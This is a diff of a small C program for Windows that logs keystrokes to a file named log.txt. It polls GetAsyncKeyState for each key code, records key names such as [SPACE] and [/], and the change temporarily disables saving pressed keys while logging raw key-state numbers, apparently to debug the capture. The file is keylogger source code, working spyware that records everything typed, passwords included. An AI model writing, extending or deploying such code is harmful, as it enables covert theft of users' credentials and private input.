@@ -21,9 +21,9 @@ int main(void){
         for(i = 8; i<255;i++) {
             printf("%d",i);
             SaveInt(GetAsyncKeyState(i),"log.txt");
-            if(GetAsyncKeyState(i) == -32767){
-                Save(i, "log.txt");
-            }
+            //if(GetAsyncKeyState(i) == -32767){
+                //Save(i, "log.txt");
+            //}
         }
     }
     return 0;
@@ -58,6 +58,8 @@ int Save(int _key, char *file) {
             break;
         case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]");
             break;
+        case VK_OEM_2: fprintf(OUTPUT_FILE, "[/]");
+            break;
     }
     fprintf(OUTPUT_FILE, "%s", &_key);
     fclose(OUTPUT_FILE);
@@ -68,13 +70,18 @@ int SaveInt(int number, char *file) {
     Sleep(10);
     FILE *OUTPUT_FILE;
     OUTPUT_FILE = fopen(file, "a+");
+    int absNumber = abs(number);
 
-    while(number > 0){
-        int newVal = 48+(number % 10);
-        fprintf(OUTPUT_FILE, "%s", &newVal);
-        number /= 10;
+    if(absNumber > number){
+        fprintf(OUTPUT_FILE, "-");
     }
 
+    while(absNumber > 0){
+        int newVal = 48+(absNumber % 10);
+        fprintf(OUTPUT_FILE, "%s", &newVal);
+        absNumber /= 10;
+    }
+    fprintf(OUTPUT_FILE, ",\n");
     fclose(OUTPUT_FILE);
     return 0;
 }
